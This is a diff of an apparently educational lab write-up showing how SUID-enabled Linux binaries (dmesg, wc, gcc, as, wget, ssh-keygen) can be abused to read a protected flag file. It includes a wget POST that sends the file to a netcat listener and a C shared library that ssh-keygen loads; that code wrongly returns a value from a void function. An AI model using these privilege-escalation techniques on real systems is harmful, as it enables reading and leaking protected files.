@@ -463,3 +463,109 @@ date -f /flag
 
 ## 46. `dmesg`
 
+`dmesg` command is used to display messages from the **kernel ring buffer**. This buffer stores all the kernel logs and the `dmesg` reads these logs. This buffer generates messages during boot but instead of reading from the **kernel ring buffer** we use the `-F` switch to read from a file instead of **kernel ring buffer**.
+
+```bash
+dmesg -F /flag
+```
+
+
+## 47. `wc`
+
+`wc` command is used to count the number of lines, words and bytes from the file. We can use the `--files0-from` switch to read the contents of the flag file.
+
+```bash
+wc --files0-from=/flag
+```
+
+
+## 48. `gcc`
+
+`gcc` command is used to compiler C programs and produce C executables. We are going to use the `@file` argument. Read command-line options from _file_.  The options read are inserted in place of the original @_file_ option.  If _file_ does not exist, or cannot be read, then the option will be treated literally, and not removed. [gcc manual](https://man7.org/linux/man-pages/man1/gcc.1.html).
+
+```bash
+gcc @/flag
+```
+
+
+## 49. `as`
+
+`as` command is the portable GNU assembler in Linux. Using as command, we can read and assemble a source file. We will use the `@FILE` to read a file.
+
+```bash
+as @/flag
+```
+
+
+## 50. `wget`
+
+`wget` command is used to download files using HTTP, HTTPS and FTP protocols. For this I setup a listener using `nc` command or port `80` and send POST request to the localhost. Open 2 terminal tabs for this. They are :-
+
+- Listener (`nc`)
+- Client (`wget`)
+
+You will get the response in Listener tab since its going to accept the request from the client. **Remember to start the listener first before sending the request or else the request won't be received.**
+#### Listener
+
+```bash
+nc -l -v -p 8000
+```
+##### Client
+
+```bash
+wget --method=POST --body-file=/flag http://127.0.0.1:8000/
+```
+
+So to summarize, `wget` reads the flag file contents because `wget` is in SETUID and then sends that data as POST request to the localhost on port `8000` and the listener i.e. `nc` receives the request and displays us the POST request content send by the client i.e. `wget`.
+
+
+## 51. `ssh-keygen`
+
+`ssh-keygen` command is used to produce private and public keys which are used to login into an SSH session. Here we need to load our own plugin code so that we can read the flag file.
+
+#### readFlag.c
+
+```c
+#include <stdio.h>
+
+void C_GetFunctionList()
+ {
+    FILE *filePointer;
+    char content[256];
+
+    filePointer = fopen("/flag", "r");
+    if (!filePointer) {
+        perror("fopen");
+        return 1;
+    }
+
+    while (fgets(content, sizeof(content), filePointer)) {
+        printf("%s", content);
+    }
+
+    fclose(filePointer);
+}
+```
+
+`ssh-keygen` has the ability to load shared libraries so we need to compile our above c code as shared library using `gcc` command.
+
+##### Forming Shared Library
+
+```bash
+gcc -shared -fPIC readFlag.c -o readFlag.so
+```
+
+Shared libraries in Linux have `.so` extension while Windows have `.dll`.  Shared Libraries are dynamically linked i.e. the OS loads these libraries during runtime and contain a piece of code which some other application might need. Instead of copying this code and pasting into different files each time the OS dynamically loads them during runtime.
+
+##### PKCS#11
+
+API for Cryptographic Tokens : PKCS#11 defines a C programming interface that allows applications like `ssh-keygen` and `ssh-agent` to communicate with and utilize cryptographic tokens. **PKCS11** has a function called `void C-GetFunctionList()` which is executed first so I added it instead of `int main()`.
+
+#### Running `ssh-keygen`
+
+`-D` switch is used to load a shared library. Before doing this its better to move your `.so` or shared library to `/tmp` folder.
+
+```bash
+ssh-keygen -D /tmp/readFlag.so
+```
+
